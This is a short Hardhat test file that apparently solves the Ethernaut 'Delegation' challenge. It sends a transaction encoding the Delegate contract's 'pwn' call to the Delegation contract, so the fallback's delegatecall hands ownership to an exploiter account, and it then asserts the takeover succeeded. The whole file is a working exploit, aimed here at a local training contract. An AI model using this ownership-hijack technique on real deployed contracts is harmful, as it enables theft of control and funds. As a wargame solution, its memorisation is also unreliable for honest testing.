import { expect } from "chai";
import { deployments, ethers, getNamedAccounts} from "hardhat";
import "hardhat-deploy-ethers";


describe("Delegation", async () =>{

  it("Should execute delegation exploit", async () =>{
    await deployments.fixture(["Delegate","Delegation"])
    const {exploiter}= await getNamedAccounts()
    const exploiterAcc= await ethers.getSigner(exploiter)
    const delegateDeployment=await deployments.get('Delegate')
    const delegationDeployment=await deployments.get('Delegation')
    const delegate = await ethers.getContractAt('Delegate',delegateDeployment.address)
    const delegation = await ethers.getContractAt('Delegation',delegationDeployment.address)
    
    const tx=await exploiterAcc.sendTransaction({
      from: exploiter,
      to: delegation.address,
      data: delegate.interface.encodeFunctionData("pwn",[]) //https://github.com/ethers-io/ethers.js/issues/478
    })
    await tx.wait()

    expect(await delegation.owner(),"Ownership couldn't be robbed").to.be.equal(exploiterAcc.address)
    
  });
});
